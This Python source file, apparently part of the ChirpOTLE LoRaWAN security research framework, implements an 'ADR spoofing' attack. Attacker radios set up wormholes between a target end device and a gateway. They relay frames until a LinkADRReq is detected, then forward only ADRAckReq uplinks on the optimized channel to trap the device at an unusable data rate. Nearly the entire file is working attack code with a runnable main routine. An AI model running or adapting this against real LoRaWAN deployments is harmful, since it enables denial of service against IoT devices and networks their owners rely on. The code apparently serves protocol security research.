#!/usr/bin/env python
import tpycontrol
import threading
import time
import sys
import os
import json

import chirpotle
from chirpotle.context import tpy_from_context
from chirpotle.tools import (
    Rx2Wormhole,
    DownlinkDelayedWormhole,
    seq_eq)

# Data rates from file
with open(os.path.join(os.path.dirname(__file__),"..","..",
        "datarates-eu868.json"), "r") as drfile:
    datarates = json.loads(drfile.read())

CH_INIT_DEFAULT = {
    "frequency": 868100000, # Hz
    "codingrate": 5, # 4/5
    "syncword": 0x34,
    **(next(dr for dr in datarates if dr['name']=='DR0')['config'])
}

# Channel that is assumed to be used _after_ the LinkADRReq
# (with this higher data rate, the end device depends on the wormhole)
CH_OPT_DEFAULT = {
    "frequency": 868100000, # Hz
    "codingrate": 5, # 4/5
    "syncword": 0x34,
    **(next(dr for dr in datarates if dr['name']=='DR5')['config'])
}

# Default channel for the rx2 downlink window
CH_RX2_DEFAULT = {
    "frequency": 869525000, # Hz
    "codingrate": 5, # 4/5
    "syncword": 0x34,
    **(next(dr for dr in datarates if dr['name']=='DR0')['config'])
}

# A note on the wormhole type
# The RX2 wormhole only works if the sum of the uplink airtime, downlink
# airtime, and communication/processing time of the framework is less than
# 1000ms. Otherwise, the RX2 frame arrives too late at the entry node to be
# replayed.
# In that case, we switch to the downlink delayed wormhole, which replays the
# downlink to uplink frame n to uplink frame n+1. For LoRaWAN 1.1, this will
# not work for confirmed uplink messages and result in a MIC failure (as the
# downlink MIC in an rx window of a confirmed uplink contains the uplink's
# frame counter)

class AdrSpoofingAttack:

    def __init__(self, nodes_ed, nodes_gw,
            channel_start = CH_INIT_DEFAULT, channel_optimized = CH_OPT_DEFAULT,
            channel_rx2 = CH_RX2_DEFAULT, adrlinkreq_timeout = 900,
            wormhole_type_phase1 = DownlinkDelayedWormhole,
            wormhole_type_phase2 = DownlinkDelayedWormhole,
            frame_listener = None, event_listener = None, 
            dev_addr = [0x00, 0x00, 0x00, 0x00], rx1_delay = 1,
            disable_heuristic = False, logfile = sys.stdout):
        """
        Creates an instance of the attack.

        :nodes_ed: Node(s) near the end device
        :nodes_gw: Node(s) near the gateway
        :param channel_start: The channel the device is currently in. Structure
        is the same as for set_lora_channel of the TPy LoRa module
        :param channel_optimized: The channel the device is assumed to switch to
        after getting the LinkADRReq command
        :param channel_rx2: RX2 channel of the network
        :adrlinkreq_timeout: Timeout after which the attacker proceeds to phase
        2 if he hasn't heard from the device any longer. We assume that the ADR
        switch was unnoticed then
        :param wormhole_type_phase1: The type of wormhole to use. Rx2Wormhole
        works only for SF10 and below, DownlinkDelayedWormhole works for all
        data rates but has more overhead
        :param wormhole_type_phase2: Womrhole type for the second phase
        :param frame_listener: Frame listener, gets the wormhole frames
        :param event_listener: Event listener, provides access to events like
        state changes of the attacker etc.
        :param dev_addr: Device address of device under attack, MSB
        :param rx1_delay: rx1 delay of the network under attack, in seconds
        :param disable_heuristic: Disable the LinkADRReq heuristic and always
        wait for timeout
        :param logfile: File descriptor to write the output to
        """
        self.nodes_ed = nodes_ed
        self.nodes_gw = nodes_gw
        self.channel_start = channel_start
        self.channel_optimized = channel_optimized
        self.channel_rx2 = channel_rx2
        self.adrlinkreq_timeout = adrlinkreq_timeout
        self.wormhole_type_phase1 = wormhole_type_phase1
        self.wormhole_type_phase2 = wormhole_type_phase2
        self.frame_listener = frame_listener
        self.event_listener = event_listener
        self.dev_addr = dev_addr
        self.rx1_delay = rx1_delay
        self.disable_heuristic = disable_heuristic
        self.logfile = logfile

        # Event will fire if the heuristic is positive for an ADRLinkReq command
        self._ev_linkadrreq = threading.Event()
        # Timeout for ADRLinkReq (maybe the command is transmitted on another,
        # non-observed channel), started after the first frame from the device
        # was received
        self._adrlinkreq_timeout_val = 0
        # If the attack is still running (may be stopped by either abort() or an
        # exception)
        self.running = True
        # Flag for phase two to validate that the AdrAckReq has gone away after
        # forwarding a frame
        self._uplink_has_adrackreq = False
        # Once the attack is in phase 2 and the ADRAckReq wormhole is up, the
        # idle flag is set
        self._idle = True
        # Stores the last frame counter of uplink frames
        self._last_fcnt = -1

    def _check_LinkADRReq(self, frame):
        """
        Check whether frame is for the target end device and run a heuristic to
        guess whether it contains the LinkADRReq to increase the data rate.
        """
        print("Checking for LinkADRReq:", file=self.logfile)
        msg = chirpotle.dissect.base.LoRaWANMessage(frame)
        print(msg.print(depth=2), file=self.logfile)
        # Check that the message is downlink, so following field access is safe
        if not msg.mhdr.data_down:
            print("-> Not a downlink", file=self.logfile)
            return
        # Check for DevAddr
        if not seq_eq(msg.payload.fhdr.devAddr, self.dev_addr):
            print("-> DevAddr mismatch", file=self.logfile)
            return
        # Reset the timeout
        self._adrlinkreq_timeout_val = time.time() + self.adrlinkreq_timeout
        print("Got downlink frame for device on this DR. Resetting timeout",
            file=self.logfile)
        # Heuristic to detect a LinkADRReq command. This command has 4 bytes
        # payload after the 1 byte command identifier, so that FOpts must be
        # >=5 bytes. For LoRaWAN 1.1, that's all we have. For LoRaWAN <1.1, one 
        # could also try to interpret the FOpts field if it is set and check for
        # actual LinkADRReq commands.
        if msg.payload.port == 0:
            # MAC commands in payload
            fopts_len = len(msg.payload.frmPayloadEncrypted)
        else:
            # MAC commands in FOpts field
            fopts_len = msg.payload.fhdr.fOptsLen
        if fopts_len >= 5:
            print("-> Assuming frame contains LinkADRReq", file=self.logfile)
            if not self.disable_heuristic:
                self._ev_linkadrreq.set()
                self._log_event("phase2", {
                    "reason": "adrlinkreq",
                    "fCnt": msg.payload.fhdr.fCnt,
                })
            else:
                print("-> Heuristic disabled, waiting for timeout",
                    file=self.logfile)
        else:
            print("-> FOpts too short for LinkADRReq (%d bytes)" % fopts_len,
                file=self.logfile)

    def _refresh_timeout(self, frame):
        """
        Refreshed the timeout also on uplink. The DownlinkDelayedWormhole won't
        work properly without it: The downlink listener is called only if the
        downlink is forwarded to the end device. So if the wormhole misses a
        downlink, the timeout will stay at 0, which means infinite.
        """
        msg = chirpotle.dissect.base.LoRaWANMessage(frame)
        if msg.mhdr.data_up and seq_eq(msg.payload.fhdr.devAddr, self.dev_addr):
            self._last_fcnt = msg.payload.fhdr.fCnt
            self._adrlinkreq_timeout_val = time.time() + self.adrlinkreq_timeout
            print("Got uplink frame for device on this DR. Resetting timeout",
                file=self.logfile)
            print(msg.print(2), file=self.logfile)

    def _forward_filter(self, frame):
        """
        Assures to forward only frames of the end device that contain ADRAckReq.
        """
        msg = chirpotle.dissect.base.LoRaWANMessage(frame)
        # Check that the message is uplink, so following field access is safe
        if not msg.mhdr.data_up:
            return False
        # Check for DevAddr
        if not seq_eq(msg.payload.fhdr.devAddr, self.dev_addr):
            return False
        if msg.payload.fhdr.adrAckReq:
            print("Got an uplink containing ADRAckReq, forwarding...",
                file=self.logfile)
            if not self._uplink_has_adrackreq:
                self._log_event("fwd_adrackreq_start", {"fCnt":
                    msg.payload.fhdr.fCnt})
            self._uplink_has_adrackreq = True
        elif self._uplink_has_adrackreq:
            print("Uplinks don't contain ADRAckReq anymore. Stop forwarding...",
                file=self.logfile)
            self._uplink_has_adrackreq = False
            self._log_event("fwd_adrackreq_stop", {"fCnt":
                msg.payload.fhdr.fCnt})
        return msg.payload.fhdr.adrAckReq

    def attack(self):
        self._phase1()
        if self.running:
            self._phase2()
        else:
            print("Attack stopped after phase 1", file=self.logfile)

    def abort(self):
        self.running = False

    def _log_event(self, event_id, event_data = dict()):
        if self.event_listener is not None:
            data = {"event": event_id, **event_data}
            self.event_listener(data)

    def _phase1(self):
        # Create the wormhole
        wormhole = self.wormhole_type_phase1(
            entry_nodes=self.nodes_ed,
            exit_nodes=self.nodes_gw,
            rx1_delay=self.rx1_delay,
            dev_addr=list(reversed(self.dev_addr)))

        # Start the wormhole
        print("Targetting device %s on %7.3f MHz at SF%d and %d kHz BW" % (
            " ".join(("0"+hex(x)[2:])[-2:] for x in self.dev_addr),
            self.channel_start['frequency'] / 1e6,
            self.channel_start['spreadingfactor'],
            self.channel_start['bandwidth']),
            file=self.logfile)
        wormhole.set_lora_channel(**self.channel_start)
        wormhole.set_lora_channel_rx2(**self.channel_rx2)
        wormhole.add_downlink_listener(self._check_LinkADRReq)
        wormhole.add_listener(self._refresh_timeout)
        if self.frame_listener:
            wormhole.add_listener(self.frame_listener)
            wormhole.add_downlink_listener(self.frame_listener)
        wormhole.up()
        print("ADR Wormhole is active, waiting for ADR adjustment.",
            file=self.logfile)

        # Wait until the heuristic says that the data rate has been adjusted
        timeout_reached = False
        while self.running and not self._ev_linkadrreq.is_set() \
                and not timeout_reached:
            timeout_reached = (self._adrlinkreq_timeout_val>0
                and self._adrlinkreq_timeout_val<time.time())
            self._ev_linkadrreq.wait(0.5)
            if not wormhole.is_up:
                print("Backing wormhole is down, stopping attack...",
                    file=self.logfile)
                self.running = False
        if timeout_reached:
            print("Timeout reached, switching to phase 2", file=self.logfile)
            self._log_event("phase2", {"reason": "timeout",
                "fCnt": self._last_fcnt})

        try:
            if self.running:
                print("Assuming LinkADRReq has been received, shutting down" + \
                    "the wormhole.", file=self.logfile)
            wormhole.remove_downlink_listener(self._check_LinkADRReq)
            wormhole.remove_listener(self._refresh_timeout)
            if self.frame_listener:
                wormhole.remove_listener(self.frame_listener)
                wormhole.remove_downlink_listener(self.frame_listener)
        finally:
            wormhole.down()
            print("ADR Wormhole is down.", file=self.logfile)

    def _phase2(self):
        # Phase 2: Forward on the optimized frequency
        # -------------------------------------------
        wormhole = self.wormhole_type_phase2(
            entry_nodes=self.nodes_ed,
            exit_nodes=self.nodes_gw,
            rx1_delay=self.rx1_delay,
            dev_addr=list(reversed(self.dev_addr)))

        print(("Starting ADRAckReq wormhole on %7.3f MHz at SF%d and" + \
            " %d kHz BW") % (
            self.channel_optimized['frequency']/1e6,
            self.channel_optimized['spreadingfactor'],
            self.channel_optimized['bandwidth']), file=self.logfile)
        wormhole.set_lora_channel(**self.channel_optimized)
        wormhole.set_lora_channel_rx2(**self.channel_rx2)
        wormhole.add_filter(self._forward_filter)
        if self.frame_listener:
            wormhole.add_listener(self.frame_listener)
            wormhole.add_downlink_listener(self.frame_listener)
        wormhole.up()
        print("ADRAckReq wormhole active, going to idle...", file=self.logfile)
        self.idle = True
        while self.running:
            time.sleep(1)
            if not wormhole.is_up:
                print("Backing wormhole is down, stopping attack...",
                    file=self.logfile)
                self.running = False
        if self.frame_listener:
            wormhole.remove_listener(self.frame_listener)
            wormhole.remove_downlink_listener(self.frame_listener)
        try:
            wormhole.down()
        finally:
            print("Attack finished.", file=self.logfile)

if __name__ == "__main__":
    # Configuration of the nodes
    tc, devices = tpy_from_context()
    gateway_nodes = [
        tc.nodes['alice']['lopy']
    ]
    device_nodes = [
        tc.nodes['bob']['lopy']
    ]
    attack = AdrSpoofingAttack(device_nodes, gateway_nodes, dev_addr=[])
    t = threading.Thread(target=attack.attack, daemon=True)
    try:
        t.start()
        was_idle = False
        while attack.running:
            if not was_idle and attack.idle:
                print("Press Ctrl+C to stop...")
            was_idle = attack.idle
            time.sleep(1)
    except KeyboardInterrupt:
        attack.abort()
        t.join()
